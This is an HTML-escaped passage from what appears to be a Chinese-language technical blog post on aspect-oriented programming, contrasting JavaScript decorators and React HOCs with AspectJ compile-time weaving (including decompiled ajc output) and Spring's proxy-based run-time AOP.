&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decorator&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// 執行前的關注切面&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token function&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// 執行後的關注切面&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;@decorator&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;decorated&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;// do something&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同時，如果用過 React 的話，可能會對 HOC ( Higher Order Component) 有印象， 以我自己的角度來看，HOC 在本質上其實很接近 AOP。&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;withExtraProps&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;Component&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;props &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;Component &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;props&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; extraProps&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Hello~&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; ComponentWithExtraProps &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;withExtraProps&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Component&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; instance &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;CComponentWithExtraProps defaultProp&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接著讓我們來看看靜態語言實現 AOP 有哪些不同的手段。 大體可以分為 “ Run-time AOP ” 跟 “ Compile-time AOP ” 。文章以下的部分將介紹 Java 生態系中不同的 AOP 實現取徑。&lt;/p&gt;
&lt;h4 id=&quot;compile-time-aop-%E2%80%94-aspectj-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#compile-time-aop-%E2%80%94-aspectj-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5&quot;&gt;#&lt;/a&gt; Compile-Time AOP — AspectJ 中的策略&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;http://eclipse.org/aspectj/&quot;&gt;AspectJ&lt;/a&gt; 是由 Eclipse Foundation 所維護的，Java生態系中最泛用的 AOP 工具。我會先簡述 AspectJ 的運作概念，接著在後面給出實作和反組譯的實際範例。&lt;/p&gt;
&lt;p&gt;簡單說明 AspectJ 的使用情境會是這樣：我們有一個物件類別定義要被複用的切面邏輯（ e.g. AuthorizeAspect ），另一個物件類別執行業務邏輯。這兩個類別彼此在 source code 中是沒有直接的關連的（只有 meta information，例如 @ annotation 標註其為切入點或切入函式 ) ，但在程式碼執行前我們可以用 AspectJ 套件自動生成將兩者關聯起來的 bytecode ，並且在正確的位置插入這些 bytecode 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/TheSpiritAndImplementationOfAOP/1__1o3LETcmZrvDa__1I__h9roQ.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;AspectJ 實現 AOP 的方式主要是所謂的 Compile-time AOP。在建置時使用 AspectJ 的插件 ( e.g. aspectj-maven-plugin )，或是在執行前讓 JavaAgent呼叫 AspectJWeaver 將 aspects 織入到 classfile。&lt;br&gt;
並且在執行期用 aspectJ 的 Runtime library ( e.g. aspectjrt ) 作為 Trampoline 來將程式的 Control flow 在正確的時間點跳轉給對應的 Advice。&lt;/p&gt;
&lt;p&gt;AspectJ 可以指名在不同的時間點執行 aspects 的織入。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Compile Time Weaving&lt;br&gt;
在編譯時就把 aspects 跟你的原始碼一起從用專屬的編譯器 (ajc) 直接編譯成包含了 aspects 的 classfile。這個操作可以是 java -&amp;gt; class (有源碼的情況) 或是 class -&amp;gt; class ( 織入第三方jar檔的狀況 )&lt;br&gt;
這麼做的好處很明顯，就是只要 ajc 編譯好了，之後 run 的時候都不會有額外的 weaving overhead。但壞處就是如果要關閉或開啟某些 aspect，就必須整包重新 compile。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/TheSpiritAndImplementationOfAOP/0__O0jiGBeR8PEv__63Z.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Load-Time Weaving&lt;br&gt;
相對地，load-time weaving 藉由定義額外的 aspect config file (下圖中的 aop.xml) ，把 weaving的操作推遲到 JVM 的 classloader load classfile 時才把對應的 aspect 織入。 這樣的操作優勢也很明顯，就是不需要每次調整 aspect 的 config 時都需要整個專案重新 compile 。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果對於 Compile-Time Weaving 跟 Load-Time Weaving 的執行效率差異有興趣的話，[4] 是個 benchmark 可以參考。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/TheSpiritAndImplementationOfAOP/0__RMHhvccYDP2ziXr3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讓我們用程式碼看看 AspectJ 具體的行為。考慮以下的 dummy 函式，我們定義了一個 Authorize Aspect ，希望在執行 dummy 函式之前以及之後，都能夠執行 Authorize 相關的邏輯，因此聲明了 before 和 after 的切入點。&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token annotation punctuation&quot;&gt;@Authorize&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;User&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;createNewUser&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; id&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InValidEmailException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;some task&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;id&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token annotation punctuation&quot;&gt;@Aspect&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeAspect&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Pointcut&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;execution(@com.example.annotation.Authorize  * *..*.*(..))&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;pointCut&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Before&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pointCut()&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;before&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;JoinPoint&lt;/span&gt; joinPoint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;UnAuthorizeException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;dummy&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token annotation punctuation&quot;&gt;@After&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pointCut()&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;JoinPoint&lt;/span&gt; joinPoint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;UnAuthorizeException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;dummy&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;為了更好地瞭解 Compiler-Time AOP的行為，我用 AspectJ 的 AJC Compiler (這邊用的是 Compile time weaving ) 織入切面，編譯完 classfile 之後再用 &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javap.html&quot;&gt;javap&lt;/a&gt; 反編譯回源碼之後如下。&lt;br&gt;
可以看到 ajc 實作 AOP 的方式就是先幫標記的 Aspect 類別建立 aspectOf() 函式取得 Aspect 類別的 Singleton ，&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AuthorizeAspect&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;aspectOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ajc$perSingletonInstance &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;NoAspectBoundException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;com.example.application.aspect.AuthorizeAspect&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ajc$initFailureCause&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ajc$perSingletonInstance&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接著在標注對應 annotation 的函式中符合切面條件的位置之前或之後插入跳轉點並傳入織入點的相關訊息(類名、方法名、參數等）&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token annotation punctuation&quot;&gt;@Authorize&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;User&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;createNewUser&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; id&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InValidEmailException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// 用 Java reflection機制獲得 JoinPoint 的 Package, class, method name 等訊息，創造 JointPoint實例&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;JoinPoint&lt;/span&gt; var3 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Factory&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;makeJP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ajc$tjp_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; id&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;User&lt;/span&gt; var7&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// 執行 Authorize 的 before aspect，並傳入 JointPoint 提供此函數的資訊與參數&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;AuthorizeAspect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;aspectOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;before&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;var3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;some task&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        var7 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;id&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; var8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token comment&quot;&gt;// 若出現異常 依然執行 after aspect並拋出異常&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;AuthorizeAspect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;aspectOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;var3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; var8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// 執行 Authorize 的 after aspect&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;AuthorizeAspect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;aspectOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;var3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; var7&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;從以上範例應該不難看出 Compile-Time AOP 的核心運作邏輯，也就是在 classfile 中根據某些 meta information (e.g. annotation) 生成對應的 aspect 函式，並且在合格的切入點處插入跳轉點的函式。&lt;/p&gt;
&lt;p&gt;基本上 Compile-Time AOP 最明顯的好處就是在於延遲低，執行期不需要知道任何 meta information，也不需要用到 &lt;a href=&quot;https://www.oracle.com/technical-resources/articles/java/javareflection.html&quot;&gt;reflection&lt;/a&gt; 機制，被織入的 code 看起來就像是原生的 code 一樣，只是幫你省掉了自己重複撰寫的麻煩。&lt;/p&gt;
&lt;h4 id=&quot;run-time-aop-%E2%80%94-spring-aop-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#run-time-aop-%E2%80%94-spring-aop-%E4%B8%AD%E7%9A%84%E7%AD%96%E7%95%A5&quot;&gt;#&lt;/a&gt; Run-Time AOP — Spring AOP 中的策略&lt;/h4&gt;
&lt;p&gt;相較於 Compile-Time AOP 中主要是藉由「織入」來完成 AOP， Run-Time AOP 希望能讓一切的相關操作都發生在執行期 (就像動態語言中的 AOP 實現那樣)。目前最主流的做法是所謂的 “Proxy-based AOP” ，以 Java 為例，便是運用 reflection API 中的 Proxy 函式庫。 再具體地細分，還可以分成靜態代理與動態代理兩種模式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;靜態代理 ( Static-Proxy)&lt;br&gt;
一句話概括說明靜態代理就是：用一個 Aspect Proxy 實現 “ Decorator Pattern ” 。所有需要被 Aspect 切入的函式都必須以介面的形式定義。 AspectProxy 類別則也需要實作此介面，把要被切入的介面的實例保存起來( target )。在呼叫 target 的介面方法時， 讓 proxy 先(或之後)去執行切面方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;com&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;proxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IFetchData&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
